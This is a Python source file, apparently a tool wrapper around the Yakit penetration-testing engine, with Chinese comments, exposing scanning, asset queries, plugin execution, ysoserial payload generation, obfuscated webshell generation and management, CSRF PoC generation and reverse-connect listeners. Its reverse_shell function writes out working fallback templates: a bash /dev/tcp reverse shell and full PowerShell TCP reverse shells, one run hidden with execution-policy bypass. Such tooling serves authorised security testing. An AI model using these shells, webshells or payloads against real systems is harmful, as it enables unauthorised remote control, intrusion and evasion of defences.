    """列出所有后台任务"""
    from .tasks import list_tasks
    return list_tasks()


def task_status(task_id: str) -> dict:
    """查询后台任务状态 + 结果（流式结果自动汇总 + 摘要提取）"""
    from .tasks import get_task
    r = get_task(task_id)
    if not r.get("ok"):
        return r
    # 结果汇总: 从 ExecResult 流中提取有用信息
    results = r.get("results") or []
    parsed = []
    raw_lines = []
    for item in results:
        text = ""
        if hasattr(item, "Message") and item.Message:
            text = item.Message.decode("utf-8", errors="replace") if isinstance(item.Message, bytes) else str(item.Message)
        elif hasattr(item, "Raw") and item.Raw:
            text = item.Raw.decode("utf-8", errors="replace") if isinstance(item.Raw, bytes) else str(item.Raw)
        if text:
            parsed.append(text[:500])
            raw_lines.append(text)
    r["results"] = parsed[:100]
    if raw_lines:
        r["summary"] = summarize_scan_events(raw_lines)
    return r


def task_wait(task_id: str, timeout: float = 120) -> dict:
    """等待任务完成并返回结果"""
    from .tasks import wait_task
    r = wait_task(task_id, timeout=timeout)
    if r.get("ok"):
        results = r.get("results") or []
        parsed = []
        raw_lines = []
        for item in results:
            text = ""
            if hasattr(item, "Message") and item.Message:
                text = item.Message.decode("utf-8", errors="replace") if isinstance(item.Message, bytes) else str(item.Message)
            elif hasattr(item, "Raw") and item.Raw:
                text = item.Raw.decode("utf-8", errors="replace") if isinstance(item.Raw, bytes) else str(item.Raw)
            if text:
                parsed.append(text[:500])
                raw_lines.append(text)
        r["results"] = parsed[:100]
        if raw_lines:
            r["summary"] = summarize_scan_events(raw_lines)
    return r


def basic_crawler(engine: YakEngine, target: str, max_depth: int = 2,
                  max_urls: int = 100, concurrent: int = 10) -> dict:
    """
    基础爬虫（StartBasicCrawler）。
    参数: target(起始URL), max_depth(深度), max_urls(最大URL数)
    返回: 爬取结果（发现的 URL）
    """
    stub = engine.connect()
    try:
        req = ypb.StartBasicCrawlerRequest()
        req.Targets = target
        req.MaxDepth = str(max_depth)
        req.MaxCountOfLinks = str(max_urls)
        req.Concurrent = concurrent
        resp = stub.StartBasicCrawler(req, timeout=300)
        text = resp.Message or resp.Raw or b""
        if isinstance(text, bytes):
            text = text.decode("utf-8", errors="replace")
        return {"ok": True, "results": [text] if text else []}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# 资产查询: 端口 / 主机 / 域名 / 风险
# ---------------------------------------------------------------------------
def query_ports(engine: YakEngine, keyword: str = "", limit: int = 50,
                hosts: str = "", ports: str = "") -> dict:
    """查询端口资产（扫描结果入库后从这里取）"""
    stub = engine.connect()
    try:
        req = ypb.QueryPortsRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if keyword:
            req.Keywords = keyword
        if hosts:
            req.Hosts = hosts
        if ports:
            req.Ports = ports
        resp = stub.QueryPorts(req)
        items = []
        for p in resp.Data or []:
            items.append({
                "id": p.Id,
                "host": p.Host,
                "ip_integer": p.IPInteger,
                "port": p.Port,
                "proto": p.Proto,
                "service": p.ServiceType,
                "state": p.State,
                "fingerprint": p.Fingerprint,
                "title": p.HtmlTitle,
                "updated_at": p.UpdatedAt,
            })
        return {"ok": True, "total": resp.Total, "ports": items}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def query_hosts(engine: YakEngine, keyword: str = "", limit: int = 50) -> dict:
    """查询主机资产（keyword 匹配域名/网段）"""
    stub = engine.connect()
    try:
        req = ypb.QueryHostsRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if keyword:
            req.DomainKeyword = keyword
        resp = stub.QueryHosts(req)
        items = []
        for h in resp.Data or []:
            items.append({
                "id": h.Id,
                "ip": h.IP,
                "ip_integer": h.IPInteger,
                "is_public": h.IsInPublicNet,
                "domains": list(h.Domains or []),
            })
        return {"ok": True, "total": resp.Total, "hosts": items}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def query_domains(engine: YakEngine, keyword: str = "", limit: int = 50) -> dict:
    """查询域名资产（keyword 匹配域名关键词）"""
    stub = engine.connect()
    try:
        req = ypb.QueryDomainsRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if keyword:
            req.DomainKeyword = keyword
        resp = stub.QueryDomains(req)
        items = []
        for d in resp.Data or []:
            items.append({
                "id": d.ID,
                "domain": d.DomainName,
                "ip": d.IPAddr,
                "title": d.HTTPTitle,
            })
        return {"ok": True, "total": resp.Total, "domains": items}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def query_risks(engine: YakEngine, keyword: str = "", limit: int = 50,
                severity: str = "") -> dict:
    """查询漏洞/风险记录"""
    stub = engine.connect()
    try:
        req = ypb.QueryRisksRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if keyword:
            req.Keywords = keyword
        if severity:
            req.Level = severity
        resp = stub.QueryRisks(req)
        items = []
        for r in resp.Data or []:
            items.append({
                "id": r.Id,
                "risk_type": r.RiskType,
                "url": r.Url,
                "title": r.Title,
                "severity": r.Severity,
                "description": (r.Description or "")[:300],
                "target": r.IP or r.Host,
                "updated_at": r.UpdatedAt,
            })
        return {"ok": True, "total": resp.Total, "risks": items}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# 编码工具: Codec / DNSLog / 反连
# ---------------------------------------------------------------------------
def codec(engine: YakEngine, text: str, codec_type: str = "Base64Encode",
          params: str = "{}") -> dict:
    """
    编解码（NewCodec 流式接口，前端同款）。
    codec_type 用 yakit_codec_methods 查（如 Base64Encode/Base64Decode/UrlEncode/SHA1）。
    params: 可选参数 JSON（如 {"Alphabet": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"}）。
            默认自动用方法的 DefaultValue 填充必填参数。
    """
    stub = engine.connect()
    try:
        # 1) 查方法定义拿默认参数（解决 base64 需要 Alphabet 等必填参数问题）
        default_params = {}
        try:
            resp_m = stub.GetAllCodecMethods(ypb.Empty())
            for m in resp_m.Methods or []:
                if m.CodecMethod == codec_type:
                    for p in m.Params or []:
                        if p.DefaultValue:
                            default_params[p.Name] = p.DefaultValue
                    break
        except Exception:
            pass
        supplied = json.loads(params) if params else {}
        merged = {**default_params, **supplied}

        req = ypb.CodecRequestFlow()
        req.Text = text
        work = ypb.CodecWork()
        work.CodecType = codec_type
        for k, v in merged.items():
            pv = ypb.ExecParamItem()
            pv.Key = k
            pv.Value = str(v)
            work.Params.append(pv)
        req.WorkFlow.append(work)
        resp = stub.NewCodec(req, timeout=30)
        return {"ok": True, "type": codec_type, "input": text[:500],
                "result": resp.Result[:5000] if resp.Result else ""}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def codec_methods(engine: YakEngine) -> dict:
    """获取可用编解码方法列表"""
    stub = engine.connect()
    try:
        resp = stub.GetAllCodecMethods(ypb.Empty())
        methods = []
        for m in resp.Methods or []:
            methods.append({
                "tag": m.Tag,
                "name": m.CodecName,
                "method": m.CodecMethod,
                "desc": m.Desc,
            })
        return {"ok": True, "total": len(methods), "methods": methods[:300]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def dnslog_domain(engine: YakEngine) -> dict:
    """获取 DNSLog 反连域名"""
    stub = engine.connect()
    try:
        resp = stub.RequireDNSLogDomain(ypb.YakDNSLogBridgeAddr())
        return {"ok": True, "domain": resp.Domain}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def dnslog_query(engine: YakEngine, token: str) -> dict:
    """查询 DNSLog 记录"""
    stub = engine.connect()
    try:
        req = ypb.QueryDNSLogByTokenRequest()
        req.Token = token
        resp = stub.QueryDNSLogByToken(req)
        logs = []
        for l in resp.Events or []:
            logs.append({
                "dns_type": l.DNSType,
                "token": l.Token,
                "domain": l.Domain,
                "remote_addr": l.RemoteAddr,
                "remote_ip": l.RemoteIP,
                "remote_port": l.RemotePort,
                "timestamp": l.Timestamp,
            })
        return {"ok": True, "token": token, "logs": logs}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def extract_url(engine: YakEngine, packet: str) -> dict:
    """从 HTTP 包提取 URL"""
    stub = engine.connect()
    try:
        req = ypb.FuzzerRequest()
        req.Request = packet
        resp = stub.ExtractUrl(req, timeout=30)
        return {"ok": True, "url": resp.Url}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# 插件/脚本: 查询 / 执行 / 对包执行
# ---------------------------------------------------------------------------
def query_plugins(engine: YakEngine, keyword: str = "", limit: int = 50,
                  tags: str = "") -> dict:
    """查询本地插件（YakScript）"""
    stub = engine.connect()
    try:
        req = ypb.QueryYakScriptRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if keyword:
            req.Keyword = keyword
        if tags:
            req.Tag.extend([t.strip() for t in tags.split(",") if t.strip()])
        resp = stub.QueryYakScript(req)
        plugins = []
        for p in resp.Data or []:
            plugins.append({
                "id": p.Id,
                "name": p.ScriptName,
                "type": p.Type,
                "tags": [t for t in (p.Tags or "").split(",") if t],
                "description": (p.Help or "")[:200],
                "level": p.Level,
            })
        return {"ok": True, "total": resp.Total, "plugins": plugins}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def exec_plugin(engine: YakEngine, script_name: str, params: str = "",
                work_dir: str = "") -> dict:
    """
    执行 Yakit 插件（ExecYakScript）。
    参数: script_name(插件名或ID), params(参数 JSON,如 {"target":"1.2.3.4"}), work_dir
    注意: 引擎要求 ScriptId/YakScriptId 字段（Script 传名字会报 cannot fetch yak script），
          这里先按名字查 id 再执行。
    """
    stub = engine.connect()
    try:
        # 1) 按名字查插件 id（QueryYakScript）
        script_id = 0
        if script_name.isdigit():
            script_id = int(script_name)
        else:
            q = ypb.QueryYakScriptRequest()
            q.Pagination.Limit = 50
            q.Pagination.Page = 1
            q.Keyword = script_name
            try:
                qresp = stub.QueryYakScript(q)
                for p in qresp.Data or []:
                    if p.ScriptName == script_name:
                        script_id = p.Id
                        break
                if not script_id and qresp.Data:
                    script_id = qresp.Data[0].Id
            except Exception:
                pass
        if not script_id:
            return {"ok": False, "reason": f"未找到插件: {script_name}"}

        # 2) 执行
        req = ypb.ExecRequest()
        req.YakScriptId = script_id
        if params:
            try:
                p = json.loads(params)
                for k, v in p.items():
                    item = ypb.ExecParamItem()
                    item.Key = k
                    item.Value = str(v)
                    req.Params.append(item)
            except Exception:
                item = ypb.ExecParamItem()
                item.Key = "target"
                item.Value = params
                req.Params.append(item)
        if work_dir:
            req.WorkDir = work_dir
        results = []
        for resp in stub.ExecYakScript(req, timeout=300):
            msg = resp.Message or b""
            if msg:
                results.append(msg.decode("utf-8", errors="replace")[:2000])
            if resp.Raw:
                results.append(resp.Raw.decode("utf-8", errors="replace")[:300])
        return {"ok": True, "script": script_name, "script_id": script_id, "results": results[:50]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def exec_packet_plugin(engine: YakEngine, script_name: str, packet: str,
                       is_https: bool = False) -> dict:
    """对 HTTP 包执行插件（ExecutePacketYakScript）—— 插件扫描/检测单个请求"""
    stub = engine.connect()
    try:
        req = ypb.ExecutePacketYakScriptParams()
        req.ScriptName = script_name
        req.IsHttps = is_https
        req.Request = packet.encode("utf-8")
        results = []
        for resp in stub.ExecutePacketYakScript(req, timeout=300):
            msg = resp.Message or b""
            if msg:
                results.append(msg.decode("utf-8", errors="replace")[:400])
        return {"ok": True, "script": script_name, "results": results[:50]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def exec_batch_packet_plugin(engine: YakEngine, script_names: str, packet: str,
                             is_https: bool = False, concurrent: int = 3,
                             timeout: float = 30) -> dict:
    """
    批量插件扫描（ExecuteBatchPacketYakScript）：一个包跑多个插件。
    script_names: 逗号分隔插件名（如 "SQL注入,XXE检测,Fastjson综合检测"）
    返回: 每个插件的状态/是否可利用/输出
    """
    stub = engine.connect()
    try:
        req = ypb.ExecuteBatchPacketYakScriptParams()
        names = [n.strip() for n in script_names.split(",") if n.strip()]
        if not names:
            return {"ok": False, "reason": "script_names 为空"}
        req.ScriptName.extend(names)
        req.IsHttps = is_https
        req.Request = packet.encode("utf-8")
        req.Concurrent = concurrent
        req.PerTaskTimeout = timeout
        results = []
        for resp in stub.ExecuteBatchPacketYakScript(req, timeout=timeout * 10 + 60):
            if resp.ProgressMessage:
                results.append({
                    "type": "progress",
                    "percent": round(resp.ProgressPercent, 2),
                    "total": resp.ProgressTotal,
                })
                continue
            item = {
                "type": "result",
                "id": resp.Id,
                "ok": bool(resp.Ok),
                "exploitable": bool(resp.Exploitable),
                "status": resp.Status,
                "reason": resp.Reason or "",
                "script": resp.PoC.ScriptName if resp.PoC else "",
            }
            if resp.Result:
                msg = resp.Result.Message or b""
                if msg:
                    item["output"] = msg.decode("utf-8", errors="replace")[:500]
            results.append(item)
        # 只保留结果 + 最后进度
        final = [r for r in results if r.get("type") == "result"]
        return {"ok": True, "scripts": names, "results": final[:50], "total_events": len(results)}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def plugin_tags(engine: YakEngine) -> dict:
    """获取插件标签列表"""
    stub = engine.connect()
    try:
        resp = stub.GetYakScriptTags(ypb.Empty())
        return {"ok": True, "tags": [{"value": t.Value, "total": t.Total} for t in (resp.Tag or [])]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def reverse_shell(engine: YakEngine, ip: str, port: int,
                  system: str = "linux", shell_type: str = "bash",
                  cmd_type: str = "bash-i", encode: str = "") -> dict:
    """
    生成反弹 shell 命令（GenerateReverseShellCommand）。
    system: linux/windows; shell_type: bash/sh/cmd/powershell 等; encode: 可选编码
    """
    stub = engine.connect()
    reason = "engine returned empty result"
    try:
        req = ypb.GenerateReverseShellCommandRequest()
        req.IP = ip
        req.port = port
        req.System = system
        req.ShellType = shell_type
        req.CmdType = cmd_type
        if encode:
            req.Encode = encode
        resp = stub.GenerateReverseShellCommand(req)
        if resp.Result:
            return {"ok": True, "result": resp.Result or "", "source": "engine"}
    except Exception as e:
        reason = repr(e)
    # 引擎不可用时（ProgramList 为空）用内置模板兜底
    templates = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "sh": f"sh -i >& /dev/tcp/{ip}/{port} 0>&1",
        "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "cmd": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    }
    tpl = templates.get(shell_type) or templates.get("bash")
    return {
        "ok": True,
        "result": tpl,
        "source": "template",
        "note": "引擎模板不可用，已返回内置模板（source=engine 时为引擎生成）",
        "engine_error": reason,
    }


def reverse_shell_programs(engine: YakEngine) -> dict:
    """获取可用的反弹 shell 程序/Shell 列表（GetReverseShellProgramList）"""
    stub = engine.connect()
    try:
        req = ypb.GetReverseShellProgramListRequest()
        resp = stub.GetReverseShellProgramList(req)
        return {
            "ok": True,
            "programs": list(resp.ProgramList or [])[:100],
            "shells": list(resp.ShellList or [])[:100],
        }
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def auto_decode(engine: YakEngine, data: str) -> dict:
    """自动解码（AutoDecode）—— 不需要指定编码方式"""
    stub = engine.connect()
    try:
        req = ypb.AutoDecodeRequest()
        req.Data = data
        resp = stub.AutoDecode(req)
        results = []
        for m in (resp.Results or []):
            results.append({
                "type": m.Type or "",
                "type_verbose": m.TypeVerbose or "",
                "origin": m.Origin.decode("utf-8", errors="replace") if m.Origin else "",
                "result": m.Result.decode("utf-8", errors="replace") if m.Result else "",
                "modified": bool(m.Modify),
            })
        return {"ok": True, "data": data, "results": results}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def yso_generate(engine: YakEngine, gadget: str = "CommonsCollections1",
                 class_name: str = "dnslog", options: str = "{}") -> dict:
    """
    生成 Yso 序列化 payload（GenerateYsoBytes）。
    class_name 为命令类型: dnslog / win_cmd / linux_cmd / jndi / bcel / raw_cmd / httplog / loadjar。
    options 为 JSON，如 {"cmd":"whoami"} 或 {"cmd":{"value":"whoami"}}。
    """
    stub = engine.connect()
    try:
        req = ypb.YsoOptionsRequerstWithVerbose()
        req.Gadget = gadget
        if class_name:
            req.Class = class_name
        if options:
            try:
                opts = json.loads(options)
                for k, v in opts.items():
                    item = ypb.YsoClassGeneraterOptionsWithVerbose()
                    item.Key = k
                    if isinstance(v, dict):
                        item.Type = v.get("type", "string")
                        item.Value = str(v.get("value", ""))
                    else:
                        item.Value = str(v)
                    req.Options.append(item)
            except Exception:
                pass
        resp = stub.GenerateYsoBytes(req)
        data = (resp.Bytes or b"")
        return {
            "ok": True,
            "gadget": gadget,
            "class": class_name,
            "payload_b64": base64.b64encode(data).decode() if data else "",
            "size": len(data),
        }
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def yso_gadgets(engine: YakEngine) -> dict:
    """获取可用的 YSO gadget 列表（GetAllYsoGadgetOptions）"""
    stub = engine.connect()
    try:
        resp = stub.GetAllYsoGadgetOptions(ypb.Empty())
        return {"ok": True, "gadgets": [o.Name for o in (resp.Options or []) if o.Name]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def reverse_server(engine: YakEngine) -> dict:
    """获取全局反连服务器信息（GetGlobalReverseServer）—— 反弹连接/探测用"""
    stub = engine.connect()
    try:
        resp = stub.GetGlobalReverseServer(ypb.Empty())
        return {
            "ok": True,
            "public_ip": resp.PublicReverseIP or "",
            "public_port": resp.PublicReversePort,
            "local_addr": resp.LocalReverseAddr or "",
            "local_port": resp.LocalReversePort,
        }
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def query_webshells(engine: YakEngine, tag: str = "", limit: int = 50) -> dict:
    """查询已保存的 WebShell（QueryWebShells），可按 tag 过滤"""
    stub = engine.connect()
    try:
        req = ypb.QueryWebShellsRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if tag:
            req.Tag = tag
        resp = stub.QueryWebShells(req)
        shells = []
        for w in (resp.Data or []):
            shells.append({
                "id": w.Id,
                "url": w.Url or "",
                "pass": w.Pass or "",
                "shell_type": w.ShellType or "",
                "status": bool(w.Status),
                "tag": w.Tag or "",
                "remark": w.Remark or "",
            })
        return {"ok": True, "total": resp.Total, "webshells": shells}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def ping_webshell(engine: YakEngine, webshell_id: int) -> dict:
    """Ping WebShell（按 id 验证连通性，返回系统信息）"""
    stub = engine.connect()
    try:
        req = ypb.WebShellRequest()
        req.Id = webshell_id
        resp = stub.Ping(req)
        return {
            "ok": True,
            "id": webshell_id,
            "state": bool(resp.State),
            "data": (resp.Data or b"").decode("utf-8", errors="replace")[:2000],
        }
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# 高级能力: CSRF POC 生成 / 流量导出 / 字典管理 / WebShell 管理 / 反连监听
# ---------------------------------------------------------------------------
def generate_csrf_poc(engine: YakEngine, packet: str, is_https: bool = False) -> dict:
    """从请求包生成 CSRF POC HTML（GenerateCSRFPocByPacket）"""
    stub = engine.connect()
    try:
        req = ypb.GenerateCSRFPocByPacketRequest()
        req.Request = packet.encode("utf-8")
        req.IsHttps = is_https
        resp = stub.GenerateCSRFPocByPacket(req)
        return {"ok": True, "code": (resp.Code or b"").decode("utf-8", errors="replace")}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def export_http_flows(engine: YakEngine, keyword: str = "", limit: int = 100,
                      source_type: str = "", field_name: str = "url") -> dict:
    """导出 HTTP 流量（ExportHTTPFlows）—— 取证/协作用"""
    stub = engine.connect()
    try:
        where = ypb.QueryHTTPFlowRequest()
        if keyword:
            where.Keyword = keyword
            where.IncludeInUrl.append(keyword)
        if source_type:
            where.SourceType = source_type
        where.Pagination.Limit = limit
        req = ypb.ExportHTTPFlowsRequest()
        req.ExportWhere.CopyFrom(where)
        if field_name:
            req.FieldName.append(field_name)
        resp = stub.ExportHTTPFlows(req)
        flows = []
        for f in resp.Data or []:
            flows.append({
                "id": f.Id,
                "method": f.Method,
                "url": f.Url,
                "status_code": f.StatusCode,
                "content_type": f.ContentType,
                "body_length": f.BodyLength,
                "request": (f.Request or "")[:500],
                "response": (f.Response or "")[:500],
            })
        return {"ok": True, "total": len(flows), "flows": flows[:100]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def query_payload(engine: YakEngine, group: str, folder: str = "",
                  keyword: str = "", limit: int = 200) -> dict:
    """查询字典内容（QueryPayload，数据库存储）"""
    stub = engine.connect()
    try:
        req = ypb.QueryPayloadRequest()
        req.Group = group
        if folder:
            req.Folder = folder
        if keyword:
            req.Keyword = keyword
        req.Pagination.Limit = limit
        resp = stub.QueryPayload(req)
        lines = []
        for p in resp.Data or []:
            content = (p.ContentBytes or b"").decode("utf-8", errors="replace")
            lines.extend([l for l in content.splitlines() if l.strip()])
        return {"ok": True, "group": group, "total": len(lines), "payloads": lines[:200]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def save_payload(engine: YakEngine, group: str, content: str,
                 folder: str = "", is_new: bool = False) -> dict:
    """保存字典（SavePayloadStream，实测可用）"""
    stub = engine.connect()
    try:
        req = ypb.SavePayloadRequest()
        req.Group = group
        req.Content = content
        req.IsNew = is_new
        if folder:
            req.Folder = folder
        results = []
        for resp in stub.SavePayloadStream(req, timeout=60):
            msg = resp.Message
            if isinstance(msg, bytes):
                msg = msg.decode("utf-8", errors="replace")
            if msg:
                results.append(str(msg)[:200])
        return {"ok": True, "group": group, "progress": results[:10]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def create_webshell(engine: YakEngine, url: str, password: str,
                    shell_type: str = "php", tag: str = "",
                    remark: str = "", proxy: str = "") -> dict:
    """创建 WebShell 记录（CreateWebShell）"""
    stub = engine.connect()
    try:
        req = ypb.WebShell()
        req.Url = url
        req.Pass = password
        req.ShellType = shell_type
        if tag:
            req.Tag = tag
        if remark:
            req.Remark = remark
        if proxy:
            req.Proxy = proxy
        resp = stub.CreateWebShell(req)
        return {"ok": True, "id": resp.Id, "url": resp.Url, "status": bool(resp.Status)}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def webshell_basic_info(engine: YakEngine, webshell_id: int) -> dict:
    """获取 WebShell 系统信息（GetBasicInfo，按 id）"""
    stub = engine.connect()
    try:
        req = ypb.WebShellRequest()
        req.Id = webshell_id
        resp = stub.GetBasicInfo(req)
        return {"ok": True, "id": webshell_id, "state": bool(resp.State),
                "data": (resp.Data or b"").decode("utf-8", errors="replace")[:2000]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def generate_webshell(engine: YakEngine, shell_type: str = "php",
                      passwd: str = "cmd", confuse: bool = False,
                      enc_mode: str = "base64", is_session: bool = False) -> dict:
    """生成 WebShell 脚本（GenerateWebShell，免杀混淆）"""
    stub = engine.connect()
    try:
        req = ypb.ShellGenerate()
        # enc_mode 枚举: raw/base64/aes_raw/aes_base64
        enc_map = {"raw": 0, "base64": 1, "aes_raw": 2, "aes_base64": 3}
        req.EncMode = enc_map.get(enc_mode, 1)
        # script 枚举: jsp=0/jspx=1/asp=2/aspx=3/php=4
        script_map = {"jsp": 0, "jspx": 1, "asp": 2, "aspx": 3, "php": 4}
        req.Script = script_map.get(shell_type, 4)
        req.Pass = passwd
        req.Confuse = confuse
        req.IsSession = is_session
        resp = stub.GenerateWebShell(req)
        return {"ok": True, "shell_type": shell_type,
                "script": (resp.Data or b"").decode("utf-8", errors="replace")[:5000]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def config_global_reverse(engine: YakEngine, tunnel_addr: str = "",
                          tunnel_secret: str = "", local_addr: str = "") -> dict:
    """
    配置全局反连服务器（ConfigGlobalReverse）。
    tunnel_addr: 隧道服务器地址（必填，如 "1.2.3.4:8088"，引擎会连接验证）
    tunnel_secret: 隧道密码（可选）
    local_addr: 本地监听地址（可选，如 "0.0.0.0:8088"）
    """
    stub = engine.connect()
    try:
        if not tunnel_addr:
            return {"ok": False, "reason": "tunnel_addr 必填（引擎会连接该隧道验证）"}
        req = ypb.ConfigGlobalReverseParams()
        req.ConnectParams.Addr = tunnel_addr
        if tunnel_secret:
            req.ConnectParams.Secret = tunnel_secret
        if local_addr:
            req.LocalAddr = local_addr
        for _ in stub.ConfigGlobalReverse(req, timeout=10):
            pass
        return {"ok": True, "configured": True, "tunnel_addr": tunnel_addr}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# 错误信息人话化
# ---------------------------------------------------------------------------
_COMMON_ERRORS = [
    ("UNAUTHENTICATED", "引擎认证失败：请确认 Yakit GUI 在运行（或引擎密码已更新）"),
    ("database is closed", "数据库被占用：Yakit GUI 正在使用引擎，请复用 GUI 引擎（不要起第二个）"),
    ("cannot fetch yak script", "插件不存在或已被移除，请先用 yakit_query_plugins 查询插件名"),
    ("target is empty", "缺少 target 参数：请传目标地址（host 或 URL）"),
    ("panic caught", "引擎内部错误（yak 引擎 bug）：可尝试重启 Yakit 或换目标"),
    ("connect failed", "无法连接目标：网络不通或目标拒绝连接"),
    ("connection refused", "目标拒绝连接（端口未开放）"),
    ("timeout", "操作超时：目标响应慢或网络延迟高"),
    ("generate command failed", "反弹 shell 生成失败（引擎模板为空）：已用内置模板兜底"),
    ("impl me", "该接口当前引擎版本未实现（yak 1.4.4 限制）"),
    ("unimplemented", "接口未实现或方法名错误：请检查参数"),
    ("params is empty", "参数不完整：缺少必填字段"),
    ("empty addr", "地址为空：请提供有效的 host:port 地址"),
]


def humanize_error(raw: str) -> str:
    """把引擎原始错误转成人话"""
    if not raw:
        return ""
    for pat, msg in _COMMON_ERRORS:
        if pat.lower() in str(raw).lower():
            return msg
    return str(raw)[:300]


# ---------------------------------------------------------------------------
# Facades 端口转发/反连监听
# ---------------------------------------------------------------------------
def facade_start(engine: YakEngine, local_port: int = 8088,
                 local_host: str = "0.0.0.0",
                 remote_port: int = 0, external_domain: str = "",
                 enable_dnslog: bool = False, dnslog_port: int = 0,
                 tunnel_addr: str = "", tunnel_secret: str = "") -> dict:
    """
    启动 Facades 监听（StartFacades）—— 端口转发/反连接收。
    本地监听 local_host:local_port，转发到远程（tunnel_addr 提供时）或接收反连。
    remote_port: 远程端口（默认等于 local_port）
    external_domain: 外部域名（可选）
    enable_dnslog: 同时启用 DNSLog 服务
    返回: task_id（后台运行，用 yakit_task_status 查状态）
    """
    from .tasks import start_stream_task
    stub = engine.connect()
    req = ypb.StartFacadesParams()
    req.LocalFacadeHost = local_host
    req.LocalFacadePort = local_port
    req.FacadeRemotePort = remote_port or local_port
    if external_domain:
        req.ExternalDomain = external_domain
    if enable_dnslog:
        req.EnableDNSLogServer = True
        req.DNSLogLocalPort = dnslog_port or local_port + 1
    if tunnel_addr:
        req.ConnectParam.Addr = tunnel_addr
        if tunnel_secret:
            req.ConnectParam.Secret = tunnel_secret
        req.Verify = True
    else:
        # 本地监听模式：不验证隧道
        req.Verify = False
    tid = start_stream_task(f"facade {local_host}:{local_port}", lambda: stub.StartFacades(req, timeout=3600))
    return {"ok": True, "task_id": tid, "local_addr": f"{local_host}:{local_port}",
            "remote_port": req.FacadeRemotePort, "hint": "用 yakit_task_status 查监听状态，任务取消即停止"}


def facade_start_with_yso(engine: YakEngine, reverse_port: int = 8088,
                          reverse_host: str = "", token: str = "",
                          is_remote: bool = False,
                          tunnel_addr: str = "", tunnel_secret: str = "",
                          gadget: str = "CommonsCollections1",
                          class_name: str = "", options: str = "{}") -> dict:
    """
    启动 Facades + YSO 反序列化监听（StartFacadesWithYsoObject）。
    用于: 反序列化攻击回连接收（如 ysoserial 生成的 payload 打回来）。
    reverse_host: 监听 host（默认本机）
    gadget/class_name/options: YSO 生成参数（dnslog/win_cmd 等）
    返回: task_id
    """
    from .tasks import start_stream_task
    stub = engine.connect()
    req = ypb.StartFacadesWithYsoParams()
    req.IsRemote = is_remote
    req.ReversePort = reverse_port
    if reverse_host:
        req.ReverseHost = reverse_host
    if token:
        req.Token = token
    if tunnel_addr:
        req.BridgeParam.Addr = tunnel_addr
        if tunnel_secret:
            req.BridgeParam.Secret = tunnel_secret
    # YSO 参数
    if class_name or options != "{}":
        yso = ypb.YsoOptionsRequerst()
        yso.Gadget = gadget
        if class_name:
            yso.Class = class_name
        try:
            opts = json.loads(options)
            for k, v in opts.items():
                item = ypb.YsoClassGeneraterOptions()
                item.Key = k
                item.Value = str(v) if not isinstance(v, dict) else str(v.get("value", ""))
                yso.Options.append(item)
        except Exception:
            pass
        req.GenerateClassParams.CopyFrom(yso)
    tid = start_stream_task(f"facade-yso :{reverse_port}", lambda: stub.StartFacadesWithYsoObject(req, timeout=3600))
    return {"ok": True, "task_id": tid, "reverse_port": reverse_port, "gadget": gadget,
            "hint": "用 yakit_task_status 查回连状态"}


def facade_stop(task_id: str) -> dict:
    """停止 Facades 监听（取消后台任务）"""
    from .tasks import cancel_task
